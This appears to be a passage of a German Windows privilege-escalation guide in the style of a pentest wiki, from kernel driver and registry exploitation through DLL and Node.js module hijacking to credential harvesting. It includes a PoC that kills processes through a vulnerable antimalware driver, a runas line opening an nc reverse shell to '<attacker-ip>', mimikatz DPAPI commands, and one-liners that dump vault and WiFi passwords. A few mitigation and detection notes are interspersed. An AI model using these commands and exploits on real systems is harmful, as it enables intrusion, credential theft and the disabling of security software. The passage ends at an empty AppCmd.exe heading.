- **Muster für racebare Offenlegung**: Jeder Systemaufruf nach dem Muster `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein vielversprechender Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (zum Beispiel durch das Hinzufügen vieler Listen-/Ressourceneinträge, die die endgültige Allokationsgröße eines Serializers erhöhen), denn der längere Kopiervorgang vergrößert das Zeitfenster für den Austausch, ohne das System zwangsläufig zum Absturz zu bringen.
- **Geeignete Ziele für den Refill mit vielen Zeigern**: Die registrierten Buffer-Arrays des Windows-**I/O-Rings** sind ausgezeichnete Ziele für Offenlegungen, da sich ihre paged-pool-Größe vom Angreifer kontrollieren lässt (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Lege eines dieser Arrays offen, ermittle das umgebende `IORING_OBJECT` und beschädige dann **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-Ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebige Kernel-Lese-/Schreibzugriffe ermöglichen. Wenn der einzige verfügbare Schreibzugriff ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibzugriffe**, um einen Benutzerzeiger aus wiederholten Bytes wie `0x0101010101010101` zu erzeugen, mappe ihn mit `VirtualAlloc` und platziere das gefälschte registrierte Buffer-Array dort.<sup>[[30]](#references)</sup>

Nützliche Hinweise für das Debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du aus dem beschädigten I/O ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehlst du mit dem üblichen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherbeschädigung von Registry-Hives

Moderne Schwachstellen in Hives ermöglichen es, deterministische Speicherlayouts gezielt vorzubereiten, beschreibbare HKLM-/HKU-Unterstrukturen auszunutzen und Metadatenbeschädigungen ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Überläufe umzuwandeln. Die vollständige Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Typverwechslung im Direct-Modus von `RtlQueryRegistryValues` durch vom Angreifer kontrollierte Pfade

Einige Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem Stack-Skalar wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` gemäß dem **tatsächlichen** Registry-Typ interpretiert und nicht gemäß dem vom Entwickler erwarteten Typ.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Angreifer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer gewählte Schlüssel abzufragen, ihre Existenz über Rückgabecodes/Logs zu leaken und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Beschädigung von Kernel-Speicher**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder Puffer mit fester Größe typverwechselt.

Hinweise zur praktischen Ausnutzung:

- **Mitigation ab Windows 8**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, anstatt Werte unter `HKCU` bereitzustellen.
- **Bereitstellung in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Unterstrukturen von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity-Token** erneut aus, um Schlüssel zu finden, auf die aus Sandbox-Kontexten zugegriffen werden kann:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff über 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im Direct Mode wird erwartet, dass `EntryContext` auf einen `UNICODE_STRING` zeigt. Lädt der Code zunächst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Stack-Wert und verwendet dann denselben Puffer erneut für einen String-Lesevorgang, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst den `Buffer`-Zeiger teilweise. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der Direct Mode das erste `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen **negativen** vom Angreifer kontrollierten Wert in der wiederverwendeten skalaren Variable, kopiert die nächste `REG_BINARY`-Abfrage die Bytes des Angreifers direkt über benachbarte Stack-Slots. Dies ist oft der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Starkes Hunting-Muster: **heterogene Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesevorgang bestimmt, ob ein zweiter erfolgt.

#### Ausnutzen von fehlendem FILE_DEVICE_SECURE_OPEN bei Device Objects (LPE + EDR-Kill)

Manche signierten Treiber von Drittanbietern erstellen ihr Device Object mit einem starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL beim Öffnen des Geräts über einen Pfad mit einer zusätzlichen Komponente nicht durchgesetzt. Dadurch kann jeder nicht privilegierte Benutzer über einen Namespace-Pfad wie diesen einen Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation ausnutzen. In freier Wildbahn beobachtete Möglichkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulation, Persistenztricks beim Booten).
- Beliebige Prozesse beenden, auch Protected Process/Light (PP/PPL), wodurch AV/EDR aus dem Userland über den Kernel beendet werden kann.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigationsmaßnahmen für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Überprüfe bei privilegierten Vorgängen den Kontext des Aufrufers. Führe PP/PPL-Prüfungen durch, bevor du das Beenden von Prozessen oder die Rückgabe von Handles erlaubst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe Broker-Modelle anstelle direkter Kernel-Berechtigungen in Betracht.

Erkennungsmöglichkeiten für Verteidiger
- Überwache das Öffnen verdächtiger Gerätenamen im User Mode (z. B. \\ .\\amsdk*) sowie bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts Blockliste für anfällige Treiber (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Berechtigungen erweitern**.<sup>[[2]](#references)</sup>

Überprüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie diese Prüfung ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js-/Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **ungekontrollierten Windows-Suchpfads**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es im Verzeichnisbaum nach oben geht und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann diese Suche bis zum Laufwerksstamm reichen, sodass eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wird, möglicherweise Folgendes prüft:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Kann ein **Benutzer mit geringen Berechtigungen** `C:\node_modules` erstellen, kann er eine schädliche `foo.js`-Datei (oder einen Paketordner) platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch wird dies zu **LPE**, wenn das Ziel als Administrator, über einen Task/einen Service-Wrapper mit erhöhten Berechtigungen oder in einer automatisch gestarteten privilegierten Desktop-App läuft.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode liegt

### Anfällige Ziele aufspüren

Verwenden Sie **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtern Sie nach `Process Name` = Zieldatei (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtern Sie nach `Path` `contains` `node_modules`
- Achten Sie auf `NAME NOT FOUND` und den letzten erfolgreichen Zugriff unter `C:\node_modules`

Nützliche Muster bei Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder durch Überprüfung des Quellcodes.
2. Erstelle das Root-Suchverzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Die Opferanwendung auslösen. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Echte Beispiele für fehlende optionale Module, die diesem Muster entsprechen, sind `bluebird` und `utf-8-validate`. Die **Technik** ist jedoch der übertragbare Teil: Finde einen beliebigen **fehlenden Bare-Import**, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennungs- und Härtungsideen

- Alarmieren, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien/Packages ablegt.
- Nach Prozessen mit hoher Integrität suchen, die aus `C:\node_modules\*` lesen.
- Alle Runtime-Abhängigkeiten in der Produktionsumgebung paketieren und die Verwendung von `optionalDependencies` überprüfen.
- Drittanbietercode auf stille Muster wie `try { require("...") } catch {}` überprüfen.
- Optionale Prüfungen deaktivieren, sofern die Bibliothek dies unterstützt (beispielsweise können manche `ws`-Deployments die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe, ob weitere bekannte Computer fest in der hosts-Datei eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Bei einem lokalen Listener solltest du seine PID dem Prozesseigentümer, dem ausführbaren Pfad und dem Dienst oder der geplanten Aufgabe zuordnen, die ihn startet. Ein Fernsteuerungsdienst ermöglicht nur dann Zugriff als sein Desktopbenutzer, wenn seine Authentifizierungs- und Befehlssteuerungen dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Pfad über eine Speicherkorruption die Analyse genau dieser Binärdatei und ihrer erreichbaren Eingaben erfordert. Scheint ein offener Port zu einem Systemprozess zu gehören, vergleiche ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor du den Backend-Dienst zuordnest; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Firewall-bezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkerkennung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn Sie Root-Rechte haben, können Sie auf einem beliebigen Port lauschen (wenn Sie `nc.exe` zum ersten Mal zum Lauschen auf einem Port verwenden, werden Sie über die GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um `bash` einfach als `root` zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

`root` unter Linux innerhalb von WSL verleiht für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, prüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Zugangsdaten gespeichert wurden. Eine Rechteausweitung erfordert weiterhin ein gültiges Konto mit höheren Berechtigungen und einen zulässigen Authentifizierungspfad. Die Verzeichnisstruktur `LocalState\rootfs` gilt für ältere WSL-Installationen. WSL 2 speichert die Distribution häufig auf einer virtuellen [`ext4.vhdx`-Festplatte](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Gib bei der automatisierten Aufzählung keine Verlaufsinhalte aus.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Anmeldedaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextfund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA-Geheimnis speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Abfragen belegen weder, ob dieses Geheimnis existiert, noch ob es abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Anmeldedaten meldest.

### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Anmeldedaten für Server, Websites und andere Programme, mit denen sich **Windows** **Benutzer automatisch anmelden** kann. Zunächst könnte es so klingen, als könnten Benutzer Anmeldedaten für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen, aber so funktioniert es nicht.

Windows Vault speichert Anmeldedaten, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diesen Credential Manager** und Windows Vault verwenden und die bereitgestellten Anmeldedaten nutzen kann, anstatt dass Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben müssen.

Wenn Anwendungen nicht mit Credential Manager interagieren, können sie meiner Meinung nach die Anmeldedaten für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung also den Tresor nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldedaten für diese Ressource** aus dem standardmäßigen Speichertresor anfordern.

Verwende `cmdkey`, um die gespeicherten Anmeldedaten auf dem Computer aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Anschließend kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit bereitgestellten Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachten Sie, dass Sie mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwenden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne administrative Rechte oder `SeDebugPrivilege` zu benötigen.

Führen Sie diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter zu dumpen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich innerhalb des Windows-Betriebssystems zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um maßgeblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Verschlüsselte Benutzer-RSA-Schlüssel werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Hauptschlüssel zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht üblicherweise aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist. Daher kann sein Inhalt nicht mit dem Befehl `dir` in CMD aufgelistet werden, wohl aber über PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Master-Passwort geschützten Anmeldedatendateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele **DPAPI masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Zugangsdaten

**PowerShell-Zugangsdaten** werden häufig für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Zugangsdaten bequem zu speichern. Sie sind mit **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Zugangsdaten-Datei kann einen beliebigen Dateinamen oder `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventur auf eine solche Datei verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` vorauszusetzen: [Windows kann Profile an anderen Orten ablegen](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Zugangsdaten-Datei an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss unabhängig davon über die erforderlichen Rechte für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei der routinemäßigen Inventarisierung verschlüsselte oder Klartextwerte auszugeben.

Um PS-Zugangsdaten aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Kürzlich ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwenden Sie das Mimikatz-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um beliebige .rdg-Dateien zu entschlüsseln.\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` können Sie viele DPAPI-Masterkeys aus dem Speicher extrahieren.

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuchen Sie lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten des Benutzers, auch Dateien mit gewöhnlichen Namen wie `config.xml`. Ermitteln Sie das Verbindungsschema und die verschlüsselten `Password`-Attribute, bevor Sie eine XML-Datei als möglichen Zugangsdatenfund betrachten. Der gespeicherte Wert ist kein DPAPI/RDCMan-Passwort; seine Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Vermeiden Sie es, bei einer breit angelegten Suche verschlüsselte Werte auszugeben.

**Exporte von Remote Desktop Plus-Profilen** können ebenfalls in Benutzerverzeichnissen oder einem freigegebenen Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Betrachten Sie ein nicht leeres Passwortelement als möglichen Zugangsdatenfund, ohne es auszugeben oder anzunehmen, dass es im Klartext vorliegt: [Der Anbieter weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das erstellende Konto und den Computer gebunden sein kann oder weniger streng konfiguriert sein kann. Bestätigen Sie die Herkunft der Datei und die Bedingungen für die Wiederherstellung, bevor Sie sich darauf verlassen.

### Sticky Notes

In Windows-Arbeitsumgebungen verwenden Menschen häufig die Sticky-Notes-App, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich dabei um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und ist immer eine Suche und Untersuchung wert.

Manchmal speichern Menschen Passwörter und andere Informationen in Haftnotiz-Apps. Die als Paket-App bereitgestellte Microsoft-App Sticky Notes speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermitteln Sie die installierte App und das Speicherformat, bevor Sie aus einer fehlenden SQLite-Datei schließen, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead-Logging verwendet, enthält eine Kopie von `plum.sqlite` allein möglicherweise nicht die zuletzt bestätigten Notizen. Bewahren Sie die zugehörige `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und schließen Sie, sofern verfügbar, auch `plum.sqlite-shm` ein; der Shared-Memory-Index kann neu erstellt werden, aber die WAL ist Bestandteil des persistenten Datenbankzustands. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Zugangsdatenfund: Überprüfen Sie das Konto, die zulässigen Zugriffsrechte und die Wiederverwendung des Passworts getrennt. Ein verschlüsselter Eintrag aus einem Passwortmanager erfordert außerdem den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Nachweis für eine Anmeldung mit höheren Berechtigungen dienen kann.

### AppCmd.exe

